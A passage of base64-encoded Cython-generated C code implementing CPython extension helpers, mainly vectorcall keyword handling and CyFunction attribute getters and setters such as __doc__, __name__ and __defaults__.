CAgICAgICBpKys7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIWtleXNfYXJlX3N0cmluZ3MpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpOwogICAgICAgIGdvdG8gY2xlYW51cDsKICAgIH0KICAgIHJlcyA9IHZjKGZ1bmMsIG5ld2FyZ3MsIG5hcmdzLCBrd25hbWVzKTsKY2xlYW51cDoKICAgIFB5X0RFQ1JFRihrd25hbWVzKTsKICAgIGZvciAoaSA9IDA7IGkgPCBua3c7IGkrKykKICAgICAgICBQeV9ERUNSRUYoa3d2YWx1ZXNbaV0pOwogICAgUHlNZW1fRnJlZShuZXdhcmdzKTsKICAgIHJldHVybiByZXM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KQp7CiAgICBQeV9zc2l6ZV90IGt3X3NpemUgPQogICAgICAgIGxpa2VseShrdyA9PSBOVUxMKSA/CiAgICAgICAgMCA6CiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBQeURpY3RfU2l6ZShrdyk7CiNlbHNlCiAgICAgICAgUHlEaWN0X0dFVF9TSVpFKGt3KTsKI2VuZGlmCiAgICBpZiAoa3dfc2l6ZSA9PSAwKSB7CiAgICAgICAgcmV0dXJuIHZjKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgIH0KI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgZWxzZSBpZiAodW5saWtlbHkoa3dfc2l6ZSA9PSAtMSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhmdW5jLCB2YywgYXJncywgbmFyZ3MsIGt3KTsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKICAgIH0gZWxzZSBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKChQeU9iamVjdCopUHlfVFlQRShmdW5jKSA9PSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlKSB7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCAqbmV3RnVuYyA9IFB5T2JqZWN0X0dldEF0dHIoZnVuYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Z1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghbmV3RnVuYykpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8gSXQncyBvbmx5IGFuIG9wdGltaXphdGlvbiwgc28gZG9uJ3QgdGhyb3cgYW4gZXJyb3IKICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgfQogICAgICAgIHJlc3VsdCA9IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QobmV3RnVuYywgY2Z1bmMpOwogICAgICAgIFB5X0RFQ1JFRihuZXdGdW5jKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgcmV0dXJuIF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QoZnVuYywgY2Z1bmMpOwp9CiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKFB5TWV0aG9kX0NoZWNrKGZ1bmMpKSB7CiAgICAgICAgZnVuYyA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihmdW5jKTsKICAgIH0KICAgIHJldHVybiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIGYsIFB5T2JqZWN0KiBjbGFzc29iaikgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKAogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZiksCiAgICAgICAgICAgICgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTsKI2Vsc2UKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKAogICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzLAogICAgICAgIChQeVR5cGVPYmplY3QqKSgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTsKI2VuZGlmCn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RvYyA9PSBOVUxMKSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIG9wLT5mdW5jX2RvYyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX2RvY19fIik7CiAgICAgICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuY19kb2MpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBpZiAoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpIHsKICAgICAgICAgICAgb3AtPmZ1bmNfZG9jID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpOwogICAgICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKQogICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICAgICByZXR1cm4gUHlfTm9uZTsKICAgICAgICB9CiNlbmRpZgogICAgfQogICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RvYyk7CiAgICByZXR1cm4gb3AtPmZ1bmNfZG9jOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY2xvc3VyZSkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2NfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHZhbHVlID09IE5VTEwpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kb2MsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBvcC0+ZnVuY19uYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbmFtZV9fIik7CiNlbHNlCiAgICAgICAgb3AtPmZ1bmNfbmFtZSA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfbmFtZSk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19uYW1lID09IE5VTEwpKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19uYW1lKTsKICAgIHJldHVybiBvcC0+ZnVuY19uYW1lOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19uYW1lLCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgUHlfSU5DUkVGKG9wLT5mdW5jX3F1YWxuYW1lKTsKICAgIHJlc3VsdCA9IG9wLT5mdW5jX3F1YWxuYW1lOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfcXVhbG5hbWUsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpIHsKICAgICAgICBvcC0+ZnVuY19kaWN0ID0gUHlEaWN0X05ldygpOwogICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kaWN0ID09IE5VTEwpKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19kaWN0KTsKICAgIHJldHVybiBvcC0+ZnVuY19kaWN0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdF9sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgImZ1bmN0aW9uJ3MgZGljdGlvbmFyeSBtYXkgbm90IGJlIGRlbGV0ZWQiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgInNldHRpbmcgZnVuY3Rpb24ncyBkaWN0aW9uYXJ5IHRvIGEgbm9uLWRpY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kaWN0LCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZ2xvYmFscyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZ2xvYmFscyk7CiAgICByZXR1cm4gb3AtPmZ1bmNfZ2xvYmFsczsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihvcCk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgIHJldHVybiBQeV9Ob25lOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSAob3AtPmZ1bmNfY29kZSkgPyBvcC0+ZnVuY19jb2RlIDogUHlfTm9uZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlfSU5DUkVGKHJlc3VsdCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBpbnQgcmVzdWx0ID0gMDsKICAgIFB5T2JqZWN0ICpyZXMgPSBvcC0+ZGVmYXVsdHNfZ2V0dGVyKChQeU9iamVjdCAqKSBvcCk7CiAgICBpZiAodW5saWtlbHkoIXJlcykpCiAgICAgICAgcmV0dXJuIC0xOwogICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMCk7CiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX3R1cGxlKTsKICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMSk7CiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX2t3ZGljdCk7CiAgICAjZWxzZQogICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMCk7CiAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c190dXBsZSkpIHJlc3VsdCA9IC0xOwogICAgZWxzZSB7CiAgICAgICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShyZXMsIDEpOwogICAgICAgIGlmICh1bmxpa2VseSghb3AtPmRlZmF1bHRzX2t3ZGljdCkpIHJlc3VsdCA9IC0xOwogICAgfQogICAgI2VuZGlmCiAgICBQeV9ERUNSRUYocmVzKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICghdmFsdWUpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5VHVwbGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2RlZmF1bHRzX18gbXVzdCBiZSBzZXQgdG8gYSB0dXBsZSBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeUVycl9XYXJuRXgoUHlFeGNfUnVudGltZVdhcm5pbmcsICJjaGFuZ2VzIHRvIGN5ZnVuY3Rpb24uX19kZWZhdWx0c19fIHdpbGwgbm90ICIKICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c190dXBsZSwgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c190dXBsZTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgewogICAgICAgIGlmIChvcC0+ZGVmYXVsdHNfZ2V0dGVyKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfdHVwbGU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTsKICAgICAgICB9CiAgICB9CiAgICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzX2xvY2tlZChvcCk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50Cl9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAoIXZhbHVlKSB7CiAgICAgICAgdmFsdWUgPSBQeV9Ob25lOwogICAgfSBlbHNlIGlmICh1bmxpa2VseSh2YWx1ZSAhPSBQeV9Ob25lICYmICFQeURpY3RfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2t3ZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fa3dkZWZhdWx0c19fIHdpbGwgbm90ICIKICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c19rd2RpY3QsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c19rd2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHsKICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikgewogICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKG9wKSA8IDApKSByZXR1cm4gTlVMTDsKICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXN1bHQgPSBQeV9Ob25lOwogICAgICAgIH0KICAgIH0KICAgIFB5X0lOQ1JFRihyZXN1bHQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBQeU9iamVjdCogcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAoIXZhbHVlIHx8IHZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICB2YWx1ZSA9IE5VTEw7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KCFQeURpY3RfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2Fubm90YXRpb25zX18gbXVzdCBiZSBzZXQgdG8gYSBkaWN0IG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5X1hJTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19hbm5vdGF0aW9ucywgdmFsdWUpOwogICAgX19QeXhfRU5E